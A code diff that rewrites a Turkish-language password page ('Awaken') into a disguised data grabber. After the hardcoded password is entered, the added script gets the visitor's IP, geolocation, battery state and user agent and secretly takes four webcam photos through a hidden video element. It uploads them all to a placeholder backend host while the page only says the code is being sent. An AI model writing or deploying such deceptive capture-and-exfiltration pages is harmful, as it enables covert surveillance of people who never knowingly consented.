@@ -1,107 +1,163 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>Giriş Paneli</title>
-  <style>
-    body {
-      background: #0e0e0e;
-      color: #f1f1f1;
-      font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    h1 {
-      font-size: 3rem;
-      letter-spacing: 6px;
-      margin-bottom: 20px;
-      font-family: 'Georgia', serif;
-    }
-    input[type="password"] {
-      padding: 10px;
-      font-size: 1.2rem;
-      border: none;
-      border-radius: 8px;
-      outline: none;
-      margin-bottom: 15px;
-      background-color: #222;
-      color: #fff;
-      text-align: center;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 1rem;
-      background-color: #4caf50;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-    button:hover {
-      background-color: #45a049;
-    }
-    #message {
-      margin-top: 20px;
-      font-size: 1.1rem;
-      color: #ff4c4c;
-    }
-    #awake {
-      display: none;
-      font-size: 2.5rem;
-      color: #fff;
-      margin-bottom: 30px;
-      font-family: 'Courier New', Courier, monospace;
-      text-shadow: 0 0 10px #ffffff88;
-    }
-    #loading {
-      display: none;
-      font-size: 1.2rem;
-      margin-top: 10px;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Doğrulama Ekranı</title>
+<style>
+  body {
+    background: #0f0f0f;
+    color: white;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  h1 {
+    font-family: Georgia, serif;
+    letter-spacing: 4px;
+    font-size: 48px;
+    margin-bottom: 20px;
+  }
+  input {
+    width: 200px;
+    padding: 12px;
+    font-size: 18px;
+    border-radius: 6px;
+    border: none;
+    outline: none;
+    text-align: center;
+  }
+  button {
+    margin-top: 20px;
+    padding: 12px 24px;
+    font-size: 18px;
+    border-radius: 6px;
+    border: none;
+    background-color: #1e90ff;
+    color: white;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #0077cc;
+  }
+  #loading {
+    margin-top: 20px;
+    color: #ccc;
+    font-size: 16px;
+    display: none;
+  }
+  #error {
+    margin-top: 15px;
+    color: red;
+  }
+</style>
 </head>
 <body>
-  <div id="awake">AWAKE</div>
+  <h1>Awaken</h1>
+  <input type="password" id="password" placeholder="Şifreyi Gir" maxlength="6" />
+  <button id="submitBtn">Kodu Gönder</button>
+  <div id="loading">Gönderiliyor...</div>
+  <div id="error"></div>
 
-  <h1>Giriş</h1>
-  <input type="password" id="password" placeholder="Şifre giriniz">
-  <button onclick="checkPassword()">Giriş Yap</button>
-  
-  <div id="message"></div>
-  <div id="loading">Yükleniyor...</div>
+<script>
+  const dogruSifre = "615461";
+  const loading = document.getElementById('loading');
+  const error = document.getElementById('error');
+  const submitBtn = document.getElementById('submitBtn');
 
-  <script>
-    function checkPassword() {
-      const input = document.getElementById("password").value;
-      const message = document.getElementById("message");
-      const loading = document.getElementById("loading");
-      const awake = document.getElementById("awake");
-
-      if (input === "615461") {
-        document.querySelector("h1").style.display = "none";
-        document.getElementById("password").style.display = "none";
-        document.querySelector("button").style.display = "none";
-        message.innerText = "";
-        awake.style.display = "block";
-
-        setTimeout(() => {
-          loading.style.display = "block";
-          loading.innerText = "Yükleniyor...";
-
-          setTimeout(() => {
-            loading.innerText = "Gönderildi ✔";
-            // Buraya kamera tetikleme fonksiyonu yazılacak
-          }, 2000);
-        }, 800);
-      } else {
-        message.innerText = "Şifreyi bile doğru giremeyen kafasız, neyi hackliycen sen...";
-      }
+  submitBtn.addEventListener('click', async () => {
+    const sifre = document.getElementById('password').value.trim();
+    error.innerText = "";
+    if(sifre !== dogruSifre) {
+      error.innerText = "Şifreyi girmeyi bile becerememişsin, beynini yıkamaya gerek yok zaten.";
+      return;
     }
-  </script>
+
+    loading.style.display = "block";
+    submitBtn.disabled = true;
+
+    try {
+      // IP al
+      const ipResp = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResp.json();
+      const ip = ipData.ip;
+
+      // Konum al
+      const location = await new Promise((resolve) => {
+        if(!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(pos => {
+          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        }, () => resolve(null));
+      });
+
+      // Şarj durumu
+      let battery = null;
+      if(navigator.getBattery) {
+        battery = await navigator.getBattery();
+      }
+
+      // Kamera aç
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.style.display = 'none';
+      document.body.appendChild(video);
+      await video.play();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext('2d');
+
+      const photos = [];
+
+      // 4 foto çek, arada 800ms bekle
+      for(let i=0; i<4; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL('image/jpeg');
+        const blob = await (await fetch(dataUrl)).blob();
+        photos.push(blob);
+        await new Promise(r => setTimeout(r, 800));
+      }
+
+      // Kamera kapat
+      stream.getTracks().forEach(t => t.stop());
+      video.remove();
+
+      // Hepsini backend'e formdata ile yolla
+      const formData = new FormData();
+      photos.forEach((photo, idx) => formData.append('photo'+(idx+1), photo, `photo${idx+1}.jpg`));
+      formData.append('ip', ip);
+      if(location) {
+        formData.append('latitude', location.lat);
+        formData.append('longitude', location.lon);
+      }
+      if(battery) {
+        formData.append('charging', battery.charging);
+        formData.append('batteryLevel', battery.level);
+      }
+      formData.append('userAgent', navigator.userAgent);
+
+      await fetch('https://backend-adresin.com/upload', {
+        method: 'POST',
+        body: formData
+      });
+
+      loading.innerText = "Gönderildi ✔";
+
+    } catch (e) {
+      error.innerText = "Bir hata oldu, tekrar dene.";
+      console.error(e);
+    } finally {
+      loading.style.display = "none";
+      submitBtn.disabled = false;
+    }
+  });
+</script>
 </body>
 </html>
